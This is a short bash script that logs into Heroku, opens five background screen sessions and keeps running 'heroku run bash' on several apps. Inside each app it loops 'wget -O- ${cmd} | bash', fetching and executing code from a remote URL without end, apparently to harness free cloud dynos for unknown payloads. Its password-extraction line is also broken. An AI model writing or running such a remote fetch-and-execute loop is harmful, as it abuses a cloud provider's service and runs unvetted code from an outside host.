#!/bin/bash

# load mail and password
mail=$HEROKU_EMAIL
passwd=$(awk -F[@] '{print $1}')
cmd=$CMD_URL

if [ -z $mail ] || [ -z $passwd ] || [ -z $cmd ]
then
	exit
fi

# login
(sleep 5; echo $mail; sleep 1; echo $passwd) | heroku login

# loop to create screen
for i in {1..5}
do
	screen -dm -S $i "while true; do (sleep 5; echo 'while true; do wget -O- ${cmd} | bash; done') | heroku run bash --app ${passwd}${i}; done"
done

# stop here
while true
do
	sleep 3600
done